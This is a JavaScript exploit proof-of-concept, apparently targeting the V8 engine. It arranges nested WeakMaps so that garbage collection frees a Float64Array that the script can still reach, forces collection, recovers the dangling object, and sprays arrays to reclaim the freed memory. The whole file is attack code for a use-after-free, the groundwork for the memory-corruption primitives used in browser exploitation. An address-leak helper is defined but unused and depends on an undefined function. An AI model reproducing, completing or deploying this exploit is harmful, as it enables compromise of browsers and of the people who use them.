let wm = new WeakMap();
let k0 = { k: 0 };
let arr_size = 1 << 20;

let MARKER_1 = 0xfe;
let MARKER_2 = 1.1337;

let SPRAY_FACTOR = 1000;
var GC_SIZE = 0x4fe00000;

function gc() {
    new ArrayBuffer(GC_SIZE);
}

function findLArr(larr) {
    for (let i = 0; i < (1 << 15); i++) {
        if (larr[i] != 1.1 && larr[i] != 0) {
            let addr = ftoi32(larr[i]);
            console.log(`[+] Found addr: ${addr}`);
            % DebugPrint(addr);
            return i;
        }
    }
    return -1;
}

function trigger() {
    let s2wm = new WeakMap();

    let v0 = { v: 0 };
    let k1 = { k: 1 };
    let k2 = { k: 2 };

    let v1 = s2wm;
    let v3 = [k1];

    let innerWm = new WeakMap();

    /* Stage 0 */
    wm.set(k1, v1);
    wm.set(v0, innerWm);
    wm.set(k0, v0);

    innerWm.set(k2, v3);
    innerWm.set(k0, k2);

    let s2innerWm = new WeakMap();
    let s2v0 = { v: 00 };
    let s2k1 = { k: 11 };

    /* Craft the UAF object */
    let s2v1__uaf = new Float64Array(arr_size).fill(MARKER_1);

    let s2k2 = { k: 22 };
    let s2v3 = [s2k1];

    /* Stage 1 */
    s2wm.set(s2k1, s2v1__uaf);
    s2wm.set(s2v0, s2innerWm);
    s2wm.set(k0, s2v0);

    s2innerWm.set(s2k2, s2v3);
    s2innerWm.set(k0, s2k2);
}

function getUafObject(wm) {
    let innerWm = wm.get(wm.get(k0));
    let s2wm = wm.get( // v1
        innerWm.get( // v3
            innerWm.get(k0) // k2
        )[0]
    );

    let s2innerWm = s2wm.get(s2wm.get(k0));
    return s2wm.get( // s2v1
        s2innerWm.get( // s2v3
            s2innerWm.get(k0) // s2k2
        )[0]
    );
}

function main() {
    trigger();
    gc()

    var uaf_object = getUafObject(wm);
    % DebugPrint(uaf_object);

    // spray with PACKED_ELEMENTS objects
    let object_array = [];

    for (var i = 0; i < SPRAY_FACTOR; i++) {
		let new_obj = new Array(arr_size).fill({})
        object_array.push(new_obj);
        %DebugPrint(object_array[i]);
    }
}
main();
